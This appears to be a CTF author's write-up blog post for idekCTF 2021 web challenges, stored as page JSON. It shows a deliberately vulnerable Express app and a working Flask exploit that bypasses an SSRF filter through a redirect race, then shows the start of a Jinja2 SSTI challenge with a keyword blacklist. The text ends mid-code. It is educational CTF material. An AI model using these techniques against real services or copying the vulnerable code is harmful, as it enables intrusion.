{"componentChunkName":"component---src-templates-blog-post-js","path":"/idekctf-2021-web-author-writeups/","result":{"data":{"site":{"siteMetadata":{"title":"downgrade"}},"markdownRemark":{"id":"ec65eaed-3151-5027-a79b-7084e95fa01d","excerpt":"I created 5 web challenges for idekCTF 2021 with the intention of exposing players to interesting concepts/techniques that they may not be aware of. I think I…","html":"<p>I created 5 web challenges for <a href=\"https://ctftime.org/event/1512\">idekCTF 2021</a> with the intention of exposing players to interesting concepts/techniques that they may not be aware of. I think I accomplished this goal as feedback was pretty well received.</p>\n<p>All challenges are publicly available on my <a href=\"https://github.com/downgraded/ctf-challenges/tree/master/idekCTF-2021/web\">github</a>.</p>\n<p>Overall, I think our event was a huge success and I’m super excited to continue hosting in the years to come!</p>\n<hr>\n<h1 id=\"difference-checker\" style=\"position:relative;\"><a href=\"#difference-checker\" aria-label=\"difference checker permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>difference checker</h1>\n<p>This was the easiest of my challenges and was based around bypassing an <a href=\"https://www.npmjs.com/package/ssrf-req-filter\">ssrf filter</a>. The filter will abort any request that makes its way to localhost. The vulnerability was not in this module, but in the application logic.</p>\n<p>The app is very straightforward. It will take two links, validates that the links do not point to localhost, and then returns a diff of the two pages.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 520px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/d436cf84a0430533b0246929a27609bb/69902/index.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.9746835443038%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQY06WPwQ6CMAyGef93MhAVoz6AmHiRG65rZcpA1nUacSYGYzj4ZYf1b76mTe5/kIzqIIJaH8sSAJSCpmmIqDam7/tpmV2/yvNZmu2L3Xyx3G7Web5K0wzp/Bwdwk9ZREbtuM7AhHwxBgCI6HRSw9oKEZGoqioApbV2zo1l/4VI8N4z8ygVEefY2lYkRPl6bQBAv0C0tmXmrrsNIQJoAI1Itm2993VtiuLgHEc5ROJHJL53cv9sfZ79AAVT0OePx0RFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"index\"\n        title=\"index\"\n        src=\"/static/d436cf84a0430533b0246929a27609bb/69902/index.png\"\n        srcset=\"/static/d436cf84a0430533b0246929a27609bb/c26ae/index.png 158w,\n/static/d436cf84a0430533b0246929a27609bb/6bdcf/index.png 315w,\n/static/d436cf84a0430533b0246929a27609bb/69902/index.png 520w\"\n        sizes=\"(max-width: 520px) 100vw, 520px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> bodyParser <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body-parser'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> app <span class=\"token operator\">=</span> <span class=\"token function\">express</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> ssrfFilter <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ssrf-req-filter'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> fetch <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'node-fetch'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> Diff <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'diff'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> hbs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express-handlebars'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> port <span class=\"token operator\">=</span> <span class=\"token number\">1337</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> flag <span class=\"token operator\">=</span> <span class=\"token string\">'idek{REDACTED}'</span><span class=\"token punctuation\">;</span>\n\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>bodyParser<span class=\"token punctuation\">.</span><span class=\"token function\">urlencoded</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token literal-property property\">extended</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\napp<span class=\"token punctuation\">.</span><span class=\"token function\">engine</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hbs'</span><span class=\"token punctuation\">,</span> hbs<span class=\"token punctuation\">.</span><span class=\"token function\">engine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    <span class=\"token literal-property property\">defaultLayout</span><span class=\"token operator\">:</span> <span class=\"token string\">'main'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">extname</span><span class=\"token operator\">:</span> <span class=\"token string\">'.hbs'</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">'view engine'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'hbs'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">validifyURL</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        valid <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span><span class=\"token literal-property property\">agent</span><span class=\"token operator\">:</span> <span class=\"token function\">ssrfFilter</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">response</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> valid<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">diffURLs</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">urls</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">const</span> pageOne <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>urls<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">r</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><span class=\"token keyword\">return</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">const</span> pageTwo <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span>urls<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">r</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><span class=\"token keyword\">return</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">return</span> Diff<span class=\"token punctuation\">.</span><span class=\"token function\">diffLines</span><span class=\"token punctuation\">(</span>pageOne<span class=\"token punctuation\">,</span> pageTwo<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string\">'error!'</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/flag'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>connection<span class=\"token punctuation\">.</span>remoteAddress <span class=\"token operator\">==</span> <span class=\"token string\">'::1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n                res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Forbidden\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">503</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/diff'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">let</span> <span class=\"token punctuation\">{</span> url1<span class=\"token punctuation\">,</span> url2 <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> url1 <span class=\"token operator\">!==</span> <span class=\"token string\">'string'</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">typeof</span> url2 <span class=\"token operator\">!==</span> <span class=\"token string\">'string'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> <span class=\"token string\">'Invalid format received'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> urls <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>url1<span class=\"token punctuation\">,</span> url2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>url <span class=\"token keyword\">of</span> urls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">const</span> valid <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">validifyURL</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>valid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                        <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token literal-property property\">error</span><span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Request to </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>url<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\"> was denied</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> difference <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">diffURLs</span><span class=\"token punctuation\">(</span>urls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        res<span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span><span class=\"token string\">'diff'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token literal-property property\">lines</span><span class=\"token operator\">:</span> difference\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\napp<span class=\"token punctuation\">.</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">App listening at http://localhost:</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>port<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>It’s immediately obvious that the goal is accessing <code class=\"language-text\">/flag</code>. But how can this be done with the ssrf filter?</p>\n<p>The issue with the application is that <code class=\"language-text\">validifyURL</code> and <code class=\"language-text\">diffURLs</code> each make their own requests to the given links. This is an issue because there is no guarantee that the same link provides the same response to both functions.</p>\n<p>The solution here is hosting a server which alternates between providing an innocent response, and a redirect to <code class=\"language-text\">http://localhost:1337/flag</code>.</p>\n<p>My exploit is as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> redirect\n<span class=\"token keyword\">from</span> threading <span class=\"token keyword\">import</span> Thread\n<span class=\"token keyword\">import</span> requests\n\nlocal_url <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;the_url_of_this_server>\"</span>\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\nreqCounter <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> reqCounter\n    <span class=\"token keyword\">if</span> reqCounter <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        reqCounter <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">'hey'</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        reqCounter <span class=\"token operator\">-=</span> <span class=\"token number\">1</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'http://localhost:1337/flag'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">start_server</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    app<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4444</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">send_payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost:1337/diff\"</span>\n    payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"url1\"</span><span class=\"token punctuation\">:</span> local_url<span class=\"token punctuation\">,</span> <span class=\"token string\">\"url2\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"http://google.com\"</span><span class=\"token punctuation\">}</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>start_server<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#Thread(target=send_payload).start()</span></code></pre></div>\n<p>Upon hosting the server and inputting the url, we see the flag in the diff response:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/9720180ed148c94f6a08e2ebd3d3ee67/4352a/diff-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.126582278481013%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAWklEQVQI12P4//f//z//QSQy+vPv/fM3H1+8/fTq3btnr/79+YeuAIwYbl/cdOHw3Munl146vRRCXjq99OKpJacOzz1zdMGZo/NPH5kHEjwFlwIzTi25dn4NAF0ZZ6YFniK1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"diff flag\"\n        title=\"diff flag\"\n        src=\"/static/9720180ed148c94f6a08e2ebd3d3ee67/f058b/diff-flag.png\"\n        srcset=\"/static/9720180ed148c94f6a08e2ebd3d3ee67/c26ae/diff-flag.png 158w,\n/static/9720180ed148c94f6a08e2ebd3d3ee67/6bdcf/diff-flag.png 315w,\n/static/9720180ed148c94f6a08e2ebd3d3ee67/f058b/diff-flag.png 630w,\n/static/9720180ed148c94f6a08e2ebd3d3ee67/40601/diff-flag.png 945w,\n/static/9720180ed148c94f6a08e2ebd3d3ee67/78612/diff-flag.png 1260w,\n/static/9720180ed148c94f6a08e2ebd3d3ee67/4352a/diff-flag.png 1364w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<hr>\n<h1 id=\"jinjail\" style=\"position:relative;\"><a href=\"#jinjail\" aria-label=\"jinjail permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>jinjail</h1>\n<p>As the name implies, this challenge involved jinja2 SSTI with a relatively restrictive filter.</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> render_template_string<span class=\"token punctuation\">,</span> request\n\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\nblacklist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span> \n    <span class=\"token string\">'request'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'config'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'self'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'class'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'flag'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'2'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'3'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'5'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'6'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'7'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'8'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'9'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'\"'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'\\''</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'.'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'\\\\'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'`'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'%'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'#'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">]</span>\n\nerror_page <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\n        {% extends \"layout.html\" %}\n        {% block body %}\n        &lt;center>\n           &lt;section class=\"section\">\n              &lt;div class=\"container\">\n                 &lt;h1 class=\"title\">Error :(&lt;/h1>\n                 &lt;p>Your request was blocked. Please try again!&lt;/p>\n              &lt;/div>\n           &lt;/section>\n        &lt;/center>\n        {% endblock %}\n        '''</span>\n\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">[</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>error_page<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>error_page<span class=\"token punctuation\">)</span>\n\n        query <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>form<span class=\"token punctuation\">[</span><span class=\"token string\">'q'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'{'</span> <span class=\"token keyword\">in</span> query <span class=\"token keyword\">and</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>bad <span class=\"token keyword\">in</span> query <span class=\"token keyword\">for</span> bad <span class=\"token keyword\">in</span> blacklist<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>error_page<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">256</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>error_page<span class=\"token punctuation\">)</span>\n\n        page <span class=\"token operator\">=</span> \\\n            <span class=\"token triple-quoted-string string\">'''\n        {{% extends \"layout.html\" %}}\n        {{% block body %}}\n        &lt;center>\n           &lt;section class=\"section\">\n              &lt;div class=\"container\">\n                 